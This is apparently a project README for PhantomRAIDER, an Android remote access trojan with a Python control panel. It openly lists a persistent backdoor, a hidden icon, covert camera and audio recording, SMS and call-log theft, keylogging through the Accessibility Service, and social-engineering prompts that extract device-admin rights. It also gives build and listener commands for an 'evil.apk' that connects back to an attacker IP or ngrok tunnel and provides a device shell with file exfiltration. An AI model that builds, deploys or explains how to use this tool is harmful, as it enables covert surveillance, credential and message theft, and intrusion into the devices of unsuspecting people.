# PhantomRAIDER 

[![MIT License](https://img.shields.io/badge/license-MIT-blue.svg)](https://opensource.org/licenses/MIT) 

PhantomRAIDER is a powerful tool designed to give control of an Android system remotely and retrieve information from it. PhantomRAIDER is a client/server application; the client side is an Android application (developed in Java), and the server side is a Python control panel.

##### PhantomRAIDER works on devices from Android 4.1 (Jelly Bean) to recent Android versions.

> PhantomRAIDER is actively being developed to support modern Android permission structures via social engineering prompts and robust persistence mechanisms.

## Features of PhantomRAIDER 
* Full persistent backdoor (utilizing WorkManager and AlarmManager)
* Invisible icon on install
* Lightweight APK which runs 24/7 in the background
* App starts automatically on boot up 
* Can record audio, video, take pictures from both cameras
* Browse call logs and SMS logs
* Get current location, SIM card details, IP, MAC address of the device
* **NEW:** Integrated Accessibility Service data collection (Keylogging, screen reading capabilities)
* **NEW:** Phased social engineering UI for granting advanced permissions (Device Admin, Overlays, Usage Stats)

## Prerequisites
PhantomRAIDER requires Python3 and Java (or Android Studio) for building the client.

## Installation
```
git clone https://github.com/zannyphantom-13/PhantomRaider.git
cd PhantomRAIDER
pip install -r requirements.txt
```

#### Note for Windows Users: 
While cloning the repository using Git bash on Windows, you may encounter long filename issues. You can circumvent this by setting `core.longpaths` to `true`:
> git config --system core.longpaths true
*(You must run Git bash with administrator privileges).*

## Usage (Windows and Linux)

* To access the hidden control panel on the infected device dial `*#*#1337#*#*`
> Note: On modern devices, ensure the app is granted "Display over other apps" permission.

### Available Modes
* `--build` - for building the android apk 
* `--ngrok` - for using ngrok tunnel (over the internet)
* `--shell` - getting an interactive shell of the device

### `build` mode

```
Usage:
  python3 PhantomRAIDER.py --build --ngrok [flags]
  Flags:
    -p, --port              Attacker port number (optional by default its set to 8000)
    -o, --output            Name for the apk file (optional by default its set to "karma.apk")
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

```
Usage:
  python3 PhantomRAIDER.py --build [flags]
  Flags:
    -i, --ip                Attacker IP address (required)
    -p, --port              Attacker port number (required)
    -o, --output            Name for the apk file (optional)
    -icon, --icon           Visible icon after installing apk (by default set to hidden)
```

Or you can manually build the apk by importing the project folder to Android Studio and generating the signed APK via gradle.

### `shell` mode
```
Usage:
  python3 PhantomRAIDER.py --shell [flags]
  Flags:
    -i, --ip                Listener IP address
    -p, --port              Listener port number
```
After running the `shell` mode you will get an interpreter of the device.

Commands which can run on the interpreter:
```
    deviceInfo                 --> returns basic info of the device
    camList                    --> returns cameraID  
    takepic [cameraID]         --> Takes picture from camera
    startVideo [cameraID]      --> starts recording the video
    stopVideo                  --> stop recording the video and return the video file
    startAudio                 --> starts recording the audio
    stopAudio                  --> stop recording the audio
    getSMS [inbox|sent]        --> returns inbox sms or sent sms in a file 
    getCallLogs                --> returns call logs in a file
    shell                      --> starts a sh shell of the device
    vibrate [number_of_times]  --> vibrate the device number of time
    getLocation                --> return the current location of the device
    getIP                      --> returns the ip of the device
    getSimDetails              --> returns the details of all sim of the device
    clear                      --> clears the screen
    getClipData                --> return the current saved text from the clipboard
    getMACAddress              --> returns the mac address of the device
    exit                       --> exit the interpreter
```

In the sh shell there are some sub commands:
```
    get [full_file_path]        --> downloads the file to the local machine (file size upto 15mb)
    put [filename]              --> uploads the file to the android device
```

## Examples

* To build the apk using ngrok which will also set the listener:
```
python3 PhantomRAIDER.py --build --ngrok -o evil.apk
```

* To build the apk using desired IP and port:
```
python3 PhantomRAIDER.py --build -i 192.169.x.x -p 8000 -o evil.apk
```

* To get the interpreter:
```
python3 PhantomRAIDER.py --shell -i 0.0.0.0 -p 8000
```

## License
PhantomRAIDER is licensed under the MIT license. Take a look at the [LICENSE](LICENSE) for more information.
